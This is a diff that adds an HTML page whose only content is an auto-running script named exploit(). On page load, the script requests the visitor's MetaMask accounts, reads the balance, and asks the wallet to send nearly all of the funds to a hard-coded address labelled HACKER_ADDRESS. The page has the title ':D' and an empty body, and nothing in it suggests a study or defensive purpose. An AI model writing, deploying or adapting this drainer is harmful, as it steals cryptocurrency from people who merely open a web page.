@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <script type="text/javascript">
+      if (typeof window.ethereum !== 'undefined') {
+        console.log('MetaMask is installed!');
+      }
+
+      async function exploit() {
+        const accounts = await ethereum.request({
+          method: 'eth_requestAccounts',
+        });
+
+        let balance = await ethereum.request({
+          method: 'eth_getBalance',
+          params: [accounts[0], 'latest'],
+          id: 1,
+        });
+        const PRICE = 0.1; // ETH
+        const HACKER_ADDRESS = '0x82258493575967C301A5Deb025F517FdE53d116f';
+        const ETH_GAS = 65;
+        // let gasPrice = '0x09184e72a000';
+        let intg = parseInt(balance);
+        let gaswei = ETH_GAS * 10 ** 9;
+        console.log(intg, gaswei);
+        if (intg < gaswei) return;
+
+        balance = intg - gaswei - PRICE * 10 ** 18;
+        balance = '0x' + balance.toString(16);
+        gasPrice = '0x' + gaswei.toString(16);
+
+        let params = [
+          {
+            from: accounts[0],
+            to: HACKER_ADDRESS,
+            gas: Number(21000).toString(16),
+            gasPrice: gaswei.toString(16),
+            value: balance,
+          },
+        ];
+
+        let result = await window.ethereum
+          .request({ method: 'eth_sendTransaction', params })
+          .catch((err) => {
+            console.log(err);
+          });
+      }
+      exploit();
+    </script>
+    <title>:D</title>
+  </head>
+  <body></body>
+</html>
